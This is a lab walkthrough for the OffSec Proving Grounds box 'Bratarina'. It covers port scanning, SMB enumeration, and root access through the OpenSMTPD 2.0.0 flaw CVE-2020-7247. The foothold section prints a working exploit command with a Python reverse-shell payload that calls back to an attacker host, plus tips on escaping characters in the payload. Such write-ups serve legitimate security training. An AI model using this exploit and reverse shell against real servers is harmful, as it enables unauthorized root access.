---
title: "PG: Bratarina"
date: 2023-11-10
draft: false
tags:
  - offsec
  - proving-grounds
  - easy
  - linux
  - opensmtpd
  - smtp
  - python-reverse-shell
categories:
  - walkthrough
---

{{< box-info name="Bratarina" os="Linux" difficulty="Easy" ip="192.168.206.71" platform="OffSec Proving Grounds" >}}

---

## Recon

### Nmap

```bash
nmap -sC -sV -oN nmap/initial 192.168.206.71
```

{{< collapse title="Full nmap output" >}}
```
PORT    STATE  SERVICE     VERSION
22/tcp  open   ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
25/tcp  open   smtp        OpenSMTPD
|_ 2.0.0 This is OpenSMTPD 2.0.0
53/tcp  closed domain
80/tcp  open   http        nginx 1.14.0 (Ubuntu)
|_http-title: Page not found - FlaskBB
445/tcp open   netbios-ssn Samba smbd 4.7.6-Ubuntu
```
{{< /collapse >}}

---

## Enumeration

### Port 80 - Web App (FlaskBB)

A Flask-based forum. No useful content, weird behavior with empty `Host:` header. Rabbit hole -- moving on.

### Port 445 - SMB

```bash
smbmap -H 192.168.206.71 -u '' -p '' -r
```

```
backups    READ ONLY    Share for backups
  └── passwd.bak
```

Downloaded `passwd.bak` -- it's just a copy of `/etc/passwd`. Another rabbit hole.

### Port 25 - SMTP

{{< callout type="flag" >}}
This is the attack vector. **OpenSMTPD 2.0.0** is ancient and has known RCE vulnerabilities.
{{< /callout >}}

```bash
smtp-commands: bratarina Hello nmap.scanme.org, pleased to meet you
2.0.0 This is OpenSMTPD 2.0.0
```

---

## Foothold

### OpenSMTPD RCE (CVE-2020-7247)

Found an exploit on [ExploitDB](https://www.exploit-db.com/exploits/47984). First, validate RCE with a ping:

```bash
python3 ./47984.py 192.168.206.71 25 'ping 192.168.49.206 -c 5'
```

Confirmed via tcpdump. Now for a shell -- the tricky part. The exploit doesn't handle special characters well (`<`, `>`, `|`, `&` are all problematic):

![Exploit execution issues](/images/bratarina/exploit-exec.png)

{{< callout type="warning" >}}
Most reverse shell one-liners won't work here because the exploit chokes on special characters. Python's `subprocess` module with escaped quotes is the way to go.
{{< /callout >}}

The working payload -- escape all commas in the Python reverse shell:

```bash
python3 ./47984.py 192.168.206.71 25 'python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.206\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"'
```

---

## Privilege Escalation

No privesc needed -- the OpenSMTPD exploit lands us directly as **root**.

---

## Proof

{{< terminal title="proof" >}}
local.txt: [redacted]
proof.txt: [redacted]
{{< /terminal >}}

![Root flag](/images/bratarina/root-flag.png)

---

## Key Takeaways

{{< callout type="note" >}}
- Enumerate **all** service versions thoroughly -- the web app and SMB were rabbit holes, SMTP was the way in
- When exploit payloads break due to character escaping, try Python's `subprocess` module with carefully escaped quotes
- OpenSMTPD 2.0.0 is critically vulnerable -- always check for known CVEs on outdated services
{{< /callout >}}
